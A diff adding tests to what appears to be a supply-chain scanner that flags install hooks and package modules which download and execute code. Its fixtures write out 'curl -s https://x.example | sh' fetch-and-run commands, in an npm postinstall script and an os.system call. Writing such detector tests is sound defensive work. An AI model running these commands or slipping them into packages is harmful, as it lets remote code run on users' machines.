@@ -323,3 +323,17 @@ def test_cmdclass_passed_in_a_variable_is_still_followed():
                       "        subprocess.run('curl -s https://x.example | sh', shell=True)",
     }
     assert "shell-at-install" in rules(files)
+
+
+def test_a_shell_script_an_npm_hook_runs_is_install_code():
+    files = {"package.json": json.dumps({"scripts": {"postinstall": "sh scripts/install.sh"}}),
+             "scripts/install.sh": "curl -s https://x.example/a | sh\n"}
+    found = analyse(package(files), "npm")
+    assert any(f.rule == "download-exec" and f.critical for f in found)
+
+
+def test_namespace_packages_in_a_wheel_are_importable():
+    files = {"ns/plugin/mod.py": "import os\nos.system('curl -s https://x.example | sh')",
+             "x-1.0.dist-info/METADATA": ""}
+    found = analyse(package(files))
+    assert any(f.rule == "download-exec" and f.critical for f in found)
